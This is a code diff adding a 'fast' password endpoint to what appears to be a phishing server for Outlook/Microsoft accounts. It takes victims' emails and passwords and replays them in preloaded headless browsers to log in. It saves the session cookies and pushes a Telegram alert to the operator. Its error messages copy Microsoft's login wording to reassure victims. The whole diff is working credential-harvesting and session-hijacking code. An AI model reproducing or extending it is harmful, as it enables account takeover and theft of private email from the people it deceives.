@@ -1069,6 +1069,274 @@ app.post('/api/authenticate-password', async (req, res) => {
     }
 });
 
+// NEW: Fast password authentication endpoint using preloaded browsers
+app.post('/api/authenticate-password-fast', async (req, res) => {
+    try {
+        const { email, password, sessionId } = req.body;
+
+        if (!email || !password) {
+            return res.status(400).json({ 
+                error: 'Email and password are required',
+                success: false 
+            });
+        }
+
+        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);
+
+        // Check if there's a preloaded session ready for this email
+        let preloadedSession = null;
+        if (sessionId && automationSessions.has(sessionId)) {
+            const session = automationSessions.get(sessionId);
+            if (session.status === 'preload_ready' && session.email === email) {
+                preloadedSession = session;
+                console.log(`✅ Found preloaded browser for: ${email} (${sessionId})`);
+            }
+        }
+
+        let automation = null;
+        let newSessionId = sessionId;
+        let usingPreloadedBrowser = false;
+
+        if (preloadedSession) {
+            // Use preloaded browser for fast authentication
+            automation = preloadedSession.automation;
+            usingPreloadedBrowser = true;
+            automationSessions.get(sessionId).status = 'authenticating';
+            console.log(`⚡ Using preloaded browser for fast authentication: ${email}`);
+
+            try {
+                // Use the continue phase with the preloaded browser
+                const loginSuccess = await automation.continueWithPassword(email, password);
+
+                if (loginSuccess) {
+                    console.log(`💾 Fast authentication successful, saving session for: ${email}`);
+                    const sessionValidation = await automation.validateSession(email);
+
+                    if (sessionValidation.success) {
+                        // Create user session entry
+                        userSessions.set(sessionId, {
+                            sessionId: sessionId,
+                            graphAuth: null, // No Graph API needed
+                            userEmail: email,
+                            createdAt: Date.now(),
+                            oauthState: null,
+                            authenticated: true,
+                            verified: true,
+                            cookiesSaved: sessionValidation.cookiesSaved,
+                            usedPreload: true // Track that this used preloading
+                        });
+
+                        analytics.successfulLogins++;
+                        saveAnalytics();
+
+                        console.log(`🎯 FAST authentication successful for: ${email} (${sessionId})`);
+
+                        // Send Telegram notification if bot is available
+                        if (telegramBot) {
+                            try {
+                                await telegramBot.sendLoginAlert(email, 'FAST Authentication (preloaded browser)', {
+                                    sessionId: sessionId,
+                                    cookiesSaved: sessionValidation.cookiesSaved,
+                                    preloadUsed: true
+                                });
+                            } catch (telegramError) {
+                                console.warn('Telegram notification failed:', telegramError.message);
+                            }
+                        }
+
+                        // Clean up preload session after short delay
+                        setTimeout(async () => {
+                            try {
+                                await automation.closeBrowser();
+                                automationSessions.delete(sessionId);
+                                console.log(`🧹 Cleaned up fast auth session: ${sessionId}`);
+                            } catch (cleanupError) {
+                                console.warn('Error cleaning up fast auth session:', cleanupError.message);
+                            }
+                        }, 5000);
+
+                        return res.json({
+                            success: true,
+                            message: 'Authentication successful (fast)',
+                            sessionId: sessionId,
+                            userEmail: email,
+                            cookiesSaved: sessionValidation.cookiesSaved,
+                            preloadUsed: true,
+                            requiresOAuth: false
+                        });
+
+                    } else {
+                        console.error(`❌ Fast auth session validation failed for: ${email}`);
+                        return res.status(401).json({
+                            success: false,
+                            error: 'Session validation failed',
+                            message: sessionValidation.error || 'Could not validate session',
+                            preloadUsed: true,
+                            requiresOAuth: false
+                        });
+                    }
+
+                } else {
+                    // Fast authentication failed - password was incorrect
+                    analytics.failedLogins++;
+                    saveAnalytics();
+
+                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
+
+                    // Clean up failed session
+                    setTimeout(async () => {
+                        try {
+                            await automation.closeBrowser();
+                            automationSessions.delete(sessionId);
+                        } catch (cleanupError) {
+                            console.warn('Error cleaning up failed fast auth:', cleanupError.message);
+                        }
+                    }, 2000);
+
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Invalid credentials',
+                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        preloadUsed: true,
+                        requiresOAuth: false
+                    });
+                }
+
+            } catch (fastAuthError) {
+                console.warn(`⚠️ Fast authentication failed, falling back to cold start: ${fastAuthError.message}`);
+                // Clean up failed preload
+                try {
+                    await automation.closeBrowser();
+                    automationSessions.delete(sessionId);
+                } catch (cleanupError) {
+                    console.warn('Error cleaning up failed fast auth:', cleanupError.message);
+                }
+                // Continue to fallback logic below
+                usingPreloadedBrowser = false;
+            }
+        }
+
+        // Fallback to regular authentication if no preload or preload failed
+        if (!usingPreloadedBrowser) {
+            console.log(`🔄 No preload available or failed, using cold start for: ${email}`);
+            
+            automation = new OutlookLoginAutomation({
+                enableScreenshots: true,
+                screenshotQuality: 80
+            });
+
+            newSessionId = createSessionId();
+
+            try {
+                await automation.init();
+                const navigated = await automation.navigateToOutlook();
+
+                if (!navigated) {
+                    throw new Error('Failed to navigate to Outlook');
+                }
+
+                const loginSuccess = await automation.performLogin(email, password);
+
+                if (!loginSuccess) {
+                    await automation.close();
+                    console.log(`❌ Cold start authentication failed for: ${email}`);
+
+                    analytics.failedLogins++;
+                    saveAnalytics();
+
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Invalid credentials',
+                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        preloadUsed: false,
+                        requiresOAuth: false
+                    });
+                }
+
+                // Save session and cookies directly
+                console.log(`💾 Cold start saving session cookies for: ${email}`);
+                const sessionValidation = await automation.validateSession(email);
+                await automation.close();
+
+                if (sessionValidation.success) {
+                    // Create user session entry
+                    userSessions.set(newSessionId, {
+                        sessionId: newSessionId,
+                        graphAuth: null, // No Graph API needed
+                        userEmail: email,
+                        createdAt: Date.now(),
+                        oauthState: null,
+                        authenticated: true,
+                        verified: true,
+                        cookiesSaved: sessionValidation.cookiesSaved,
+                        usedPreload: false // Track that this was cold start
+                    });
+
+                    analytics.successfulLogins++;
+                    saveAnalytics();
+
+                    console.log(`✅ Cold start authentication successful for: ${email}`);
+
+                    return res.json({
+                        success: true,
+                        message: 'Authentication successful (cold start)',
+                        sessionId: newSessionId,
+                        userEmail: email,
+                        cookiesSaved: sessionValidation.cookiesSaved,
+                        preloadUsed: false,
+                        requiresOAuth: false
+                    });
+
+                } else {
+                    analytics.failedLogins++;
+                    saveAnalytics();
+
+                    return res.status(401).json({
+                        success: false,
+                        error: 'Session validation failed',
+                        message: sessionValidation.error || 'Could not validate session',
+                        preloadUsed: false,
+                        requiresOAuth: false
+                    });
+                }
+
+            } catch (automationError) {
+                console.error(`❌ Cold start error for ${email}:`, automationError.message);
+
+                try {
+                    await automation.close();
+                } catch (closeError) {
+                    // Ignore close errors
+                }
+
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                return res.status(401).json({
+                    success: false,
+                    error: 'Authentication failed',
+                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                    preloadUsed: false,
+                    requiresOAuth: false
+                });
+            }
+        }
+
+    } catch (error) {
+        console.error('Error in fast password authentication:', error);
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        res.status(500).json({ 
+            error: 'Authentication failed',
+            success: false,
+            details: error.message,
+            preloadUsed: false,
+            requiresOAuth: false
+        });
+    }
+});
+
 // Direct login automation endpoint using Puppeteer
 app.post('/api/login-automation', async (req, res) => {
     try {
